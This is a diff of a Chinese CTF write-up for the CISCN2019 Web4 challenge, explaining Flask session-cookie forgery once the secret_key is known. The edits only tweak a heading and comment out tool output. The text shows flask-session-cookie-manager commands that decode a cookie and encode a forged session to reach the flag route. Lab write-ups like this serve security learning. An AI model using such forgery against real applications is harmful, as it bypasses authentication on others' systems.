@@ -26,7 +26,7 @@ session数据                                     时间戳       签名
 
 注意到了最重要的签名部分其实只有`secret_key`部分是一个未知，也就是说我们只要拿到了`secret_key`，就能伪造任意内容的session了。
 
-## 例题
+## 例题：
 ###  CISCN2019 华东南赛区【Web4】
 进去是一个链接，但是打不开了，（不知道为什么）但是查看源代码发现是传一个url参数，猜测是ssrf，尝试之后也没反应，也可能是文件包含，再试试，果然能读到
 ![600](assets/Day%203/file-20251220021309697.png)
@@ -114,14 +114,17 @@ print(randStr)
 https://www.jyshare.com/compile/6/
 ```bash
 PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833'
-{'username': b'www-data'}
+
+#{'username': b'www-data'}
 PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  decode -c 'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.aUWTbQ.0TPXGKzeVGnMLGVPXIYTyxqUHcs' -s '74.8534422833095'
-[Decoding error] Signature b'0TPXGKzeVGnMLGVPXIYTyxqUHcs' does not match
+
+#[Decoding error] Signature b'0TPXGKzeVGnMLGVPXIYTyxqUHcs' does not match
 ```
 我们这里需要`username=fuck`，用工具改一下：
 ```bash
 PS D:\webtool\flask-session-cookie-manager> python flask_session_cookie_manager3.py  encode -s '74.8534422833' -t "{'username': b'fuck'}"
-eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.aUWhdQ.taV6yt4OcPpldzPixEfVI_XnvbA
+
+#eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.aUWhdQ.taV6yt4OcPpldzPixEfVI_XnvbA
 ```
 然后访问flag路由就好了，注意这里，我们伪造是只需要key的，因为后面的签名和前面有关
 ![500](assets/Day%203/file-20251220030430083.png)
